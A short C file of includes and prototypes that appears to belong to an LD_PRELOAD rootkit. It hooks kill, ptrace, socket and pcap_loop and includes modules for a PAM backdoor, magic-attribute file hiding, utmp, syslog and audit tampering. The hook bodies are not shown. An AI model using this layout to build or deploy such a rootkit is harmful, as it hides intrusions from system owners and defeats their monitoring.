#include "libdl/libdl.h"
#ifdef PAM_AUTH_LOGGING
#include "authlog/authlog.h"
#endif
#ifdef USE_MAGIC_ATTR
#include "xattr/xattr.h"
#endif
int kill(pid_t pid, int sig);
#include "kill.c"
#ifndef NO_PCAP_STUFF
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user);
#include "pcap.c"
#endif
long ptrace(void *request, pid_t pid, void *addr, void *data);
#include "ptrace.c"
int ssme(int domain, int protocol) __attribute((visibility("hidden")));
int socket(int domain, int type, int protocol);
#include "socket.c"
#include "exec/exec.h"
#include "open/open.h"
#include "stat/stat.h"
#include "rw/rw.h"
#include "dir/dir.h"
#include "ln/links.h"
#include "gid/gid.h"
#include "perms/perms.h"
#ifdef USE_PAM_BD
#include "pwd/pwd.h"
#include "utmp/utmp.h"
#endif
#include "syslog/syslog.h"
#include "audit/audit.h"